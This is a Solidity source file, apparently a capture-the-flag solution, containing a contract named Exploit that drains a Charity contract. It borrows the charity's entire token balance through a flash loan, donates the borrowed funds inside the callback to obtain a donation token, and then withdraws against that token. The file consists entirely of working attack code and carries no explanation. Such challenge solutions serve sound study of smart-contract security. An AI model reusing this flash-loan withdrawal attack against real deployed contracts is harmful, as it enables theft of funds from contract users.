// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "./Charity.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface ICharity {
    function flashLoan(uint256 amount) external;
    function donate(uint256 amount) external returns (uint256);
    function withdraw(uint256 amount, uint256 _tokenID) external;
}

contract Exploit is ERC721Holder, Ownable {
    using SafeERC20 for IERC20;
    address private immutable charity;
    address private immutable cggc;
    address private immutable kind;
    uint256 private tokenID;

    uint256 private attackAmount;
    uint256 private donateAmount;

    constructor(address _charity, address _cggc, address _kind) Ownable(msg.sender) {
        charity = _charity;
        cggc = _cggc;
        kind = _kind;
    }

    function hack() public onlyOwner {
        attackAmount = IERC20(cggc).balanceOf(charity);

        ICharity(charity).flashLoan(attackAmount);

        ICharity(charity).withdraw(donateAmount, tokenID);
    }

    function flashCallback(uint256 amount) external {
        IERC20(cggc).approve(charity, amount);
        tokenID = ICharity(charity).donate(amount);

        donateAmount = amount;
    }
}
